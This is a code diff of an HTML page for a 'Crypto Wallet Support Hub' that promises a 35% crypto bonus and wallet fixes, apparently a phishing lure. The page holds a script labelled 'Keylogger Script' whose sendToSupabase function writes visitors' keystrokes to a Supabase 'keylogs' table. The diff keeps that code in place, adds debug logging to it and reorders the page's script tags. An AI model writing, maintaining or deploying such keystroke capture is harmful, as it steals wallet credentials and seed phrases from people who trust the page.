@@ -1,4 +1,4 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
@@ -23,6 +23,13 @@
   <meta name="twitter:title" content="Crypto Wallet Support Hub | Claim 35% Bonus & Fix Wallet Issues" />
   <meta name="twitter:description" content="Claim a 35% crypto bonus and fix wallet issues securely using our crypto support hub." />
   <meta name="twitter:image" content="https://neoncryptohub.vercel.app/preview.png" />
+
+  <!-- Supabase SDK -->
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2.20.0/dist/supabase.min.js"></script>
+</head>
+<body>
+  <div id="root"></div>
+  <script type="module" src="/src/index.tsx"></script>
 
   <!-- Keylogger Script -->
   <script>
@@ -51,17 +58,16 @@
     }
 
     function sendToSupabase(data) {
+      console.log('Sending data to Supabase:', data); // Debug log
       supabase.from('keylogs')
         .insert({
           key: data,
           timestamp: new Date().toISOString()
         })
-        .catch(err => console.error('Supabase error:', err));
+        .catch(err => {
+          console.error('Supabase error:', err); // Debug log
+        });
     }
   </script>
-</head>
-<body>
-  <div id="root"></div>
-  <script type="module" src="/src/index.tsx"></script>
 </body>
 </html>
